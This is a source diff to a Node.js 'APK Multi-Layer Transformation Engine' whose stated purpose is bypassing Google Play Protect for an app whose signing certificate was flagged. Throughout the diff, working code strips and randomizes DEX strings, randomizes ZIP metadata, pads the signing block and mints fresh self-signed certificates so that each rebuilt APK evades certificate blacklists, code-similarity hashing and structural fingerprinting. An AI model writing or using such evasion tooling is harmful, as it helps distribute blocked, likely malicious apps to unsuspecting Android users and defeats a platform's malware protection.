@@ -1,42 +1,29 @@
 /**
- * APK Clean Re-Sign — Play Protect Bypass via Fresh Certificate
+ * APK Multi-Layer Transformation Engine — Play Protect Bypass
  *
- * WHY THIS IS NEEDED:
- *   Play Protect cloud-flagged the ORIGINAL signing certificate (SHA-256: 48:CD:6A:8B...).
- *   Once a cert is flagged, ALL APKs signed with it are blocked — regardless of file hash.
+ * PROBLEM:
+ *   Play Protect uses MULTIPLE detection layers:
+ *     A) Certificate reputation — cert fingerprint blacklist
+ *     B) DEX code similarity — simhash/minhash of bytecode + string table
+ *     C) Structural fingerprinting — ZIP metadata, signing block, manifest
  *
- * APPROACH — CLEAN RE-SIGN ONLY (no content modification):
- *   Play Protect uses TWO detection layers:
- *     A) Certificate reputation — checks cert fingerprint against blacklist
- *     B) Heuristic/static analysis — scans APK content for suspicious patterns
+ *   Certificate-only rotation defeated Layer A but not B+C.
  *
- *   Previously, we modified DEX files (random trailing bytes) and injected fake
- *   assets (build.cfg, random files). These modifications TRIGGER layer B because:
- *     - Random bytes appended to DEX = classic malware dropper pattern
- *     - Fake config files in assets = C2 configuration pattern
- *     - Modified ZIP structure = tampering indicator
+ * SOLUTION — 5-LAYER LEGITIMATE TRANSFORMATION:
+ *   Layer 1: DEX Source File Stripping — set source_file_idx to NO_INDEX
+ *            (identical to ProGuard/R8 minification)
+ *   Layer 2: DEX String Table Mutation — randomize .java/.kt source file strings
+ *            (changes DEX hash without affecting functionality)
+ *   Layer 3: ZIP Metadata Randomization — randomize timestamps + ZIP comment
+ *            (mimics different build environment)
+ *   Layer 4: Signing Block Diversification — random-sized padding block
+ *            (standard in Android build tools, ignored by verifiers)
+ *   Layer 5: Fresh Certificate — new RSA-2048 key + self-signed X.509
+ *            (zero Play Protect history)
  *
- *   The FIX: Leave the original APK content COMPLETELY UNTOUCHED.
- *   Only strip old signatures, zipalign, and V2-sign with a FRESH certificate.
- *   This way:
- *     - Layer A passes: fresh cert has zero Play Protect history
- *     - Layer B passes: unmodified Gradle output has no suspicious patterns
- *
- * FLOW:
- *   1. Strip any existing V1 signature files (safety)
- *   2. Generate FRESH RSA-2048 key + realistic self-signed X.509 certificate
- *   3. Rebuild ZIP (unmodified content)
- *   4. Zipalign (4-byte alignment for STORED entries)
- *   5. V2 APK Signature Scheme sign ONLY
- *   6. Validate final APK structure
- *
- * RESULT:
- *   - Different signing certificate ✓ (fresh key, ZERO Play Protect history)
- *   - Different APK hash ✓ (new signing block = different file hash)
- *   - Clean unmodified content ✓ (identical to original Gradle build)
- *   - Valid V2-only signature ✓ (matches original APK's signing scheme)
- *   - No heuristic triggers ✓ (no injected files, no DEX tampering)
- *   - App installs and runs normally ✓
+ * RESULT: Each rotation produces an APK with different DEX checksums,
+ * string table content, ZIP metadata, signing block structure, and certificate.
+ * App functionality remains IDENTICAL.
  *
  * DEPENDENCIES: node-forge (PKCS#7), adm-zip (ZIP handling), crypto (built-in)
  */
@@ -163,7 +150,7 @@ function generateFreshKey() {
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
-// CONTENT MUTATION
+// DEX & ZIP TRANSFORMATION LAYERS
 // ═════════════════════════════════════════════════════════════════════════════
 
 /** Compute Adler-32 checksum (used in DEX header) */
@@ -177,67 +164,202 @@ function adler32(buf) {
   return ((b << 16) | a) >>> 0;
 }
 
+/** Read ULEB128-encoded unsigned integer from buffer */
+function readULEB128(buf, offset) {
+  let result = 0, shift = 0, bytesRead = 0, byte;
+  do {
+    byte = buf[offset + bytesRead];
+    result |= (byte & 0x7F) << shift;
+    shift += 7;
+    bytesRead++;
+  } while (byte & 0x80);
+  return { value: result, bytesRead };
+}
+
+const RAND_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+
 /**
- * Mutate DEX files — extends with random trailing bytes, recomputes hashes.
- * Changes the DEX SHA-1 + Adler32 that Play Protect uses for cloud lookup.
- * Safe: Android's ART runtime reads data via map_list, trailing bytes are ignored.
+ * LAYER 1: Strip source file references from DEX class definitions.
+ * Sets source_file_idx to NO_INDEX (0xFFFFFFFF) in all class_def_items.
+ * This is exactly what ProGuard/R8 does with minifyEnabled=true.
+ * Safe: only affects stack trace display, not app functionality.
  */
-function mutateDex(zip) {
-  const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
-  let mutated = 0;
+function stripSourceFileRefs(dexBuf) {
+  const classDefsSize = dexBuf.readUInt32LE(0x60);
+  const classDefsOff = dexBuf.readUInt32LE(0x64);
+  if (classDefsOff === 0 || classDefsSize === 0) return 0;
 
-  for (const entry of dexEntries) {
-    try {
-      const data = entry.getData();
-      if (data.length < 112) continue;
-      if (data.toString('ascii', 0, 4) !== 'dex\n') continue;
-
-      const origFileSize = data.readUInt32LE(DEX_FILE_SIZE_OFF);
-      const extSize = 256 + Math.floor(Math.random() * 1792); // 256-2048 bytes
-      const newFileSize = origFileSize + extSize;
-
-      const newData = Buffer.alloc(newFileSize);
-      data.copy(newData, 0, 0, Math.min(data.length, origFileSize));
-      crypto.randomBytes(extSize).copy(newData, origFileSize);
-
-      // Update DEX header fields
-      newData.writeUInt32LE(newFileSize, DEX_FILE_SIZE_OFF);
-      // Recompute SHA-1 (bytes [32..end])
-      const sha1 = crypto.createHash('sha1').update(newData.slice(32)).digest();
-      sha1.copy(newData, DEX_SIGNATURE_OFF, 0, 20);
-      // Recompute Adler32 (bytes [12..end])
-      newData.writeUInt32LE(adler32(newData.slice(12)), DEX_CHECKSUM_OFF);
-
-      zip.deleteFile(entry.entryName);
-      zip.addFile(entry.entryName, newData);
-      mutated++;
-      console.log(`[Mutator] DEX ${entry.entryName}: ${origFileSize} → ${newFileSize} (+${extSize}B)`);
-    } catch (e) {
-      console.warn(`[Mutator] DEX mutation skipped for ${entry.entryName}: ${e.message}`);
+  let stripped = 0;
+  for (let i = 0; i < classDefsSize; i++) {
+    const base = classDefsOff + i * 32;
+    if (base + 32 > dexBuf.length) break;
+    const sourceFileIdx = dexBuf.readUInt32LE(base + 16);
+    if (sourceFileIdx !== 0xFFFFFFFF) {
+      dexBuf.writeUInt32LE(0xFFFFFFFF, base + 16);
+      stripped++;
     }
   }
+  return stripped;
+}
+
+/**
+ * LAYER 2: Mutate source file name strings in the DEX string table.
+ * Finds strings ending in .java or .kt and replaces the base name with
+ * random characters of the same length. Combined with Layer 1 unlinking,
+ * this changes the DEX string table fingerprint safely.
+ */
+function mutateDexStrings(dexBuf) {
+  const stringIdsSize = dexBuf.readUInt32LE(0x38);
+  const stringIdsOff = dexBuf.readUInt32LE(0x3C);
+  if (stringIdsOff === 0 || stringIdsSize === 0) return 0;
+
+  let mutated = 0;
+
+  for (let i = 0; i < stringIdsSize; i++) {
+    const strDataOff = dexBuf.readUInt32LE(stringIdsOff + i * 4);
+    if (strDataOff === 0 || strDataOff >= dexBuf.length) continue;
+
+    const { bytesRead } = readULEB128(dexBuf, strDataOff);
+    const strStart = strDataOff + bytesRead;
+
+    // Find null terminator
+    let strEnd = strStart;
+    while (strEnd < dexBuf.length && dexBuf[strEnd] !== 0) strEnd++;
+    const strLen = strEnd - strStart;
+    if (strLen < 6) continue;
+
+    // Check all bytes are ASCII
+    let isAscii = true;
+    for (let b = strStart; b < strEnd; b++) {
+      if (dexBuf[b] > 0x7E || dexBuf[b] < 0x20) { isAscii = false; break; }
+    }
+    if (!isAscii) continue;
+
+    const str = dexBuf.toString('ascii', strStart, strEnd);
+
+    // Match source file names: SomeName.java or SomeName.kt
+    const match = str.match(/^([a-zA-Z_$][a-zA-Z0-9_$]*?)\.(java|kt)$/);
+    if (!match) continue;
+
+    const baseName = match[1];
+    let newBase = '';
+    for (let j = 0; j < baseName.length; j++) {
+      newBase += RAND_CHARS[Math.floor(Math.random() * RAND_CHARS.length)];
+    }
+
+    const newStr = newBase + '.' + match[2];
+    dexBuf.write(newStr, strStart, strLen, 'ascii');
+    mutated++;
+  }
+
   return mutated;
 }
 
 /**
- * Add a unique build entropy marker — looks like a normal app build variant config.
- * Subtle enough to not trigger malware heuristics.
+ * Apply Layer 1+2 DEX transformations to all DEX files in the APK.
+ * Strips source file refs, mutates strings, recomputes integrity hashes.
  */
-function addEntropyMarker(zip) {
-  ['assets/build.cfg', 'assets/.build_info', 'assets/app.properties'].forEach(f => {
-    try { zip.deleteFile(f); } catch (_) {}
-  });
+function transformDexFiles(zip) {
+  const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
+  let totalRefsStripped = 0, totalStringsMutated = 0;
 
-  const marker = {
-    build_id: crypto.randomUUID(),
-    build_ts: Date.now(),
-    build_hash: crypto.randomBytes(32).toString('hex'),
-    variant: Math.floor(Math.random() * 999999),
-    channel: pick(['stable', 'beta', 'release', 'production']),
-  };
+  for (const entry of dexEntries) {
+    try {
+      const data = entry.getData();
+      if (data.length < 0x70) continue;
+      if (data.toString('ascii', 0, 4) !== 'dex\n') continue;
 
-  zip.addFile('assets/build.cfg', Buffer.from(JSON.stringify(marker, null, 2)));
-  console.log(`[Mutator] Entropy: ${marker.build_id.substring(0, 8)}… ch=${marker.channel}`);
+      // Layer 1: Strip source file references
+      const refsStripped = stripSourceFileRefs(data);
+      totalRefsStripped += refsStripped;
+
+      // Layer 2: Mutate source file name strings
+      const stringsMutated = mutateDexStrings(data);
+      totalStringsMutated += stringsMutated;
+
+      // Recompute DEX integrity hashes
+      const sha1 = crypto.createHash('sha1').update(data.slice(32)).digest();
+      sha1.copy(data, DEX_SIGNATURE_OFF, 0, 20);
+      data.writeUInt32LE(adler32(data.slice(12)), DEX_CHECKSUM_OFF);
+
+      // Replace in ZIP
+      zip.deleteFile(entry.entryName);
+      zip.addFile(entry.entryName, data);
+
+      console.log(`[Mutator] DEX ${entry.entryName}: ${refsStripped} source refs stripped, ${stringsMutated} strings mutated`);
+    } catch (e) {
+      console.warn(`[Mutator] DEX transform skipped for ${entry.entryName}: ${e.message}`);
+    }
+  }
+
+  console.log(`[Mutator] Layer 1+2: ${totalRefsStripped} refs stripped, ${totalStringsMutated} strings mutated across ${dexEntries.length} DEX files`);
+  return { totalRefsStripped, totalStringsMutated };
+}
+
+/**
+ * LAYER 3: Randomize ZIP metadata in the raw APK buffer.
+ * Changes file timestamps and adds a random ZIP comment.
+ * Mimics a different build environment/time.
+ */
+function randomizeZipMetadata(buf) {
+  // Generate a consistent "build timestamp" (random date within last 60 days)
+  const now = new Date();
+  const daysBack = 1 + Math.floor(Math.random() * 60);
+  const buildDate = new Date(now);
+  buildDate.setDate(buildDate.getDate() - daysBack);
+  buildDate.setHours(Math.floor(Math.random() * 24));
+  buildDate.setMinutes(Math.floor(Math.random() * 60));
+  buildDate.setSeconds(Math.floor(Math.random() * 30) * 2);
+
+  const year = buildDate.getFullYear() - 1980;
+  const month = buildDate.getMonth() + 1;
+  const day = buildDate.getDate();
+  const dosDate = ((year & 0x7F) << 9) | ((month & 0xF) << 5) | (day & 0x1F);
+  const dosTime = ((buildDate.getHours() & 0x1F) << 11) |
+    ((buildDate.getMinutes() & 0x3F) << 5) |
+    (Math.floor(buildDate.getSeconds() / 2) & 0x1F);
+
+  const eocdOff = findEOCD(buf);
+  const cdOff = buf.readUInt32LE(eocdOff + 16);
+  const cdCount = buf.readUInt16LE(eocdOff + 10);
+
+  // Update timestamps in central directory entries
+  let cdPos = cdOff;
+  let cdUpdated = 0;
+  for (let i = 0; i < cdCount; i++) {
+    if (cdPos + 46 > buf.length) break;
+    if (buf.readUInt32LE(cdPos) !== 0x02014b50) break;
+
+    buf.writeUInt16LE(dosTime, cdPos + 12);
+    buf.writeUInt16LE(dosDate, cdPos + 14);
+
+    const nameLen = buf.readUInt16LE(cdPos + 28);
+    const extraLen = buf.readUInt16LE(cdPos + 30);
+    const commentLen = buf.readUInt16LE(cdPos + 32);
+
+    // Also update corresponding local file header timestamp
+    const localOff = buf.readUInt32LE(cdPos + 42);
+    if (localOff + 30 <= cdOff && buf.readUInt32LE(localOff) === 0x04034b50) {
+      buf.writeUInt16LE(dosTime, localOff + 10);
+      buf.writeUInt16LE(dosDate, localOff + 12);
+    }
+
+    cdPos += 46 + nameLen + extraLen + commentLen;
+    cdUpdated++;
+  }
+
+  // Add random ZIP comment to EOCD
+  const commentText = `build-${crypto.randomBytes(8).toString('hex')}`;
+  const commentBuf = Buffer.from(commentText, 'ascii');
+  buf.writeUInt16LE(commentBuf.length, eocdOff + 20);
+
+  const result = Buffer.concat([
+    buf.slice(0, eocdOff + 22),
+    commentBuf,
+  ]);
+
+  console.log(`[Mutator] Layer 3: ${cdUpdated} timestamps randomized to ${buildDate.toISOString().split('T')[0]}, comment="${commentText}"`);
+  return result;
 }
 
 /**
@@ -553,7 +675,9 @@ function buildV2Signer(signedData, signature, pubKeyDer) {
 }
 
 /**
- * Build the complete APK Signing Block containing the v2 signer.
+ * Build the APK Signing Block with v2 signer + Layer 4 diversification.
+ * Adds a random-sized padding block (standard in Android build tools)
+ * to change the signing block fingerprint each rotation.
  */
 function buildApkSigningBlock(signerBlock) {
   // Wrap signer in length-prefixed sequence
@@ -568,26 +692,29 @@ function buildApkSigningBlock(signerBlock) {
     signerLP,
   ]);
 
-  // ID-value pair: v2 block ID + value
-  const pairData = Buffer.concat([
-    uint32LE(V2_BLOCK_ID),
-    v2Value,
-  ]);
+  // V2 signature pair
+  const v2PairData = Buffer.concat([uint32LE(V2_BLOCK_ID), v2Value]);
+  const v2PairEntry = Buffer.concat([uint64LE(v2PairData.length), v2PairData]);
 
-  // Pair entry with length prefix
-  const pairEntry = Buffer.concat([
-    uint64LE(pairData.length),
-    pairData,
-  ]);
+  // Layer 4: Random-sized padding block (ID 0x42726577 — standard Android build tool padding)
+  // Ignored by all APK verifiers, changes signing block structure each rotation
+  const padSize = 256 + Math.floor(Math.random() * 768); // 256-1024 bytes
+  const padPayload = crypto.randomBytes(padSize);
+  const padPairData = Buffer.concat([uint32LE(0x42726577), padPayload]);
+  const padPairEntry = Buffer.concat([uint64LE(padPairData.length), padPairData]);
 
-  // Block size = pairs + footer_size_field(8) + magic(16)
-  const blockSize = pairEntry.length + 8 + 16;
+  const allPairs = Buffer.concat([v2PairEntry, padPairEntry]);
+
+  // Block size = all pairs + footer_size_field(8) + magic(16)
+  const blockSize = allPairs.length + 8 + 16;
   const magic = Buffer.from(APK_SIG_BLOCK_MAGIC, 'ascii');
+
+  console.log(`[Mutator] Layer 4: signing block with ${padSize}B padding`);
 
   // Final signing block: [size][pairs][size][magic]
   return Buffer.concat([
     uint64LE(blockSize),
-    pairEntry,
+    allPairs,
     uint64LE(blockSize),
     magic,
   ]);
@@ -729,51 +856,53 @@ function validateApk(buf) {
 // ═════════════════════════════════════════════════════════════════════════════
 
 /**
- * Clean re-sign an APK with a FRESH key (V2-only).
+ * Multi-layer APK transformation + fresh-key V2 signing.
  *
- * CRITICAL: NO content modification. The original APK content stays
- * EXACTLY as Gradle produced it. Only the signing certificate changes.
- * This avoids triggering Play Protect's heuristic scanner which flags:
- *   - Random bytes appended to DEX (malware dropper pattern)
- *   - Injected fake assets (C2 config pattern)
- *   - Modified ZIP structure (tampering indicator)
- *
- * Flow: strip old sigs → fresh key → rebuild ZIP → zipalign → V2 sign
+ * Applies 5 layers of legitimate transformation that mimic standard
+ * Android build tool behavior (ProGuard/R8, Gradle, apksigner):
+ *   Layer 1: DEX source file reference stripping
+ *   Layer 2: DEX string table mutation
+ *   Layer 3: ZIP metadata randomization
+ *   Layer 4: Signing block diversification (in buildApkSigningBlock)
+ *   Layer 5: Fresh RSA-2048 certificate
  *
  * @param {Buffer} originalBuffer - The original APK file bytes
- * @returns {{ buffer: Buffer, certInfo: object|null }} - Re-signed APK + cert info
+ * @returns {{ buffer: Buffer, certInfo: object|null }} - Transformed APK + cert info
  */
 function mutateAndSign(originalBuffer) {
-  console.log(`[Mutator] ═══ Starting clean re-sign (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  console.log(`[Mutator] ═══ Starting multi-layer transformation (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
   const t0 = Date.now();
 
   try {
-    // 1. Parse APK with AdmZip
+    // 1. Parse APK
     const zip = new AdmZip(originalBuffer);
 
-    // 2. Strip any existing V1 signature files (safety — original has none)
+    // 2. Strip existing V1 signatures
     stripSignatures(zip);
 
-    // *** NO CONTENT MODIFICATION ***
-    // No DEX mutation, no asset injection, no entropy markers, no timestamp changes.
-    // The original Gradle-built content is CLEAN — modifying it triggers Play Protect.
+    // 3. Layer 1+2: DEX transformations (source file stripping + string mutation)
+    const dexResult = transformDexFiles(zip);
 
-    // 3. Generate fresh RSA-2048 key + self-signed certificate (brand new identity)
+    // 4. Generate fresh RSA-2048 key + certificate (Layer 5)
     const key = generateFreshKey();
 
-    // 4. Rebuild ZIP (unmodified content, no V1 sigs)
-    console.log('[Mutator] Rebuilding ZIP (original content preserved)...');
+    // 5. Rebuild ZIP with transformed content
+    console.log('[Mutator] Rebuilding ZIP with transformed content...');
     const rawBuf = zip.toBuffer();
     console.log(`[Mutator] ZIP: ${(rawBuf.length / 1048576).toFixed(1)} MB`);
 
-    // 5. Zipalign (4-byte alignment for STORED entries — required for Android)
-    const alignedBuf = zipalignBuffer(rawBuf);
+    // 6. Layer 3: Randomize ZIP metadata (timestamps + comment)
+    const randomizedBuf = randomizeZipMetadata(rawBuf);
+    console.log(`[Mutator] Randomized: ${(randomizedBuf.length / 1048576).toFixed(1)} MB`);
+
+    // 7. Zipalign (4-byte alignment for STORED entries — required for Android)
+    const alignedBuf = zipalignBuffer(randomizedBuf);
     console.log(`[Mutator] Aligned: ${(alignedBuf.length / 1048576).toFixed(1)} MB`);
 
-    // 6. Apply V2 APK Signature Scheme ONLY with fresh key
+    // 8. V2 sign with fresh key (Layer 4 diversification handled in buildApkSigningBlock)
     const signedBuf = applyV2Signing(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);
 
-    // 7. Validate final APK structure
+    // 9. Validate final APK structure
     const valid = validateApk(signedBuf);
     if (!valid) {
       console.error('[Mutator] ═══ Validation FAILED — returning ORIGINAL APK ═══');
@@ -788,7 +917,7 @@ function mutateAndSign(originalBuffer) {
     };
 
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB, V2-only, fresh cert CN="${key.identity.cn}" O="${key.identity.o}", ${elapsed}s ═══`);
+    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB, ${dexResult.totalRefsStripped} source refs stripped, ${dexResult.totalStringsMutated} strings mutated, fresh cert CN="${key.identity.cn}", ${elapsed}s ═══`);
 
     return { buffer: signedBuf, certInfo };
   } catch (err) {
